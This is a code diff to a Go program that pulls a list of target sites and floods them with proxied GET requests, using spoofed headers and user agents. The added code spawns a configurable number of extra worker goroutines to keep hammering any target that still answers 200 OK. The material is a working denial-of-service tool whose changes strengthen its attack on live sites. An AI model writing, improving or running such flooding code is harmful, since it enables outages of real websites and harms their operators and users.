@@ -29,6 +29,10 @@ var workers int
 var useProxy bool
 var onlyOk bool
 var repeattarget bool
+var repeatsleepbefore int
+var repeaterspawnnewworkers bool
+var repeaterspawnnewworkerscount int
+
 var referers[] string
 var useragentsandroid[] string
 var useragentsios[] string
@@ -59,14 +63,14 @@ func getSites() SiteStruct {
 
 	req, err := http.NewRequest(http.MethodGet, url, nil)
 	if err != nil {
-		fmt.Println("Retrying sites download")
+		fmt.Println("Retrying sites download (req)")
 		time.Sleep(time.Second * 5)
 		return getSites()
 	}
 
 	res, getErr := spaceClient.Do(req)
 	if getErr != nil {
-		fmt.Println("Retrying sites download")
+		fmt.Println("Retrying sites download (execute)")
 		time.Sleep(time.Second * 5)
 		return getSites()
 	}
@@ -77,7 +81,7 @@ func getSites() SiteStruct {
 
 	body, readErr := ioutil.ReadAll(res.Body)
 	if readErr != nil {
-		fmt.Println("Retrying sites download")
+		fmt.Println("Retrying sites download (body read)")
 		time.Sleep(time.Second * 5)
 		return getSites()
 	}
@@ -158,6 +162,9 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 	}
 	req, err := http.NewRequest("GET", target, nil)
 	if err != nil {
+		if(ebus != nil) {
+			ebus <- id
+		}
 		return
 	}
 	setRandomHeaders(&req.Header)
@@ -166,7 +173,9 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 		if !onlyOk {
 			log.Println(err)
 		}
-		ebus <- id
+		if(ebus != nil) {
+			ebus <- id
+		}
 		return
 	}
 	_, err2 := ioutil.ReadAll(resp.Body)
@@ -174,16 +183,34 @@ func requestMe(target string, proxyUrl string, proxyAuth string, ebus chan int, 
 		if !onlyOk {
 			log.Println(err)
 		}
-		ebus <- id
+		if(ebus != nil) {
+			ebus <- id
+		}
 		return
 	}
 	log.Println("200 OK!", target)
 	if(repeattarget) {
-		log.Println("Found working target, requesting again", target)
-		time.Sleep(time.Millisecond * 50)
-		requestMe(target, proxyUrl, proxyAuth, ebus, id)
+		if(ebus == nil){ 
+			log.Println("Continuing to targeting a ", target)
+		} else {
+			log.Println("Found a working target, repeating or spawning ", target)
+		}
+		if(repeaterspawnnewworkers && ebus != nil) {
+			fmt.Print("Spawning repeater worker... ")
+			for i := 0; i < repeaterspawnnewworkerscount; i++ {
+				time.Sleep(time.Duration(repeatsleepbefore) * time.Millisecond)
+				go requestMe(target, proxyUrl, proxyAuth, nil, i)
+			}
+
+			ebus <- id
+			
+		} else {
+			requestMe(target, proxyUrl, proxyAuth, ebus, id)
+		}
 	} else {
-		ebus <- id
+		if(ebus != nil) {
+			ebus <- id
+		}
 	}
 }
 
@@ -387,6 +414,7 @@ func main() {
 
 
 	workers, _ = strconv.Atoi(os.Getenv("WORKERS"))
+	repeatsleepbefore, _ = strconv.Atoi(os.Getenv("REPEATSLEEPBEFORE"))
 	disguiseAsBotPercentage, _ = strconv.Atoi(os.Getenv("DISGUISEASBOTPERCENTAGE"))
 	timeoutFrom, _ := strconv.Atoi(os.Getenv("TIMEOUT"))
 	timeout = time.Duration(timeoutFrom) * time.Millisecond
@@ -395,6 +423,10 @@ func main() {
 	onlyOkOs := os.Getenv("ONLYOK")
 	onlyOk = onlyOkOs == "true"
 	repeattargetOs := os.Getenv("REPEATTARGET")
+	repeaterspawnnewworkerscount , _ = strconv.Atoi(os.Getenv("REPEATERSPAWNNEWWORKERSCOUNT"))
+	repeaterspawnnewworkersOs := os.Getenv("REPEATERSPAWNNEWWORKERS")
+	repeaterspawnnewworkers = repeaterspawnnewworkersOs == "true"
+
 	repeattarget = repeattargetOs == "true"
 	devices = make([]string, 4)
 	devices[0] = "ANDROID"
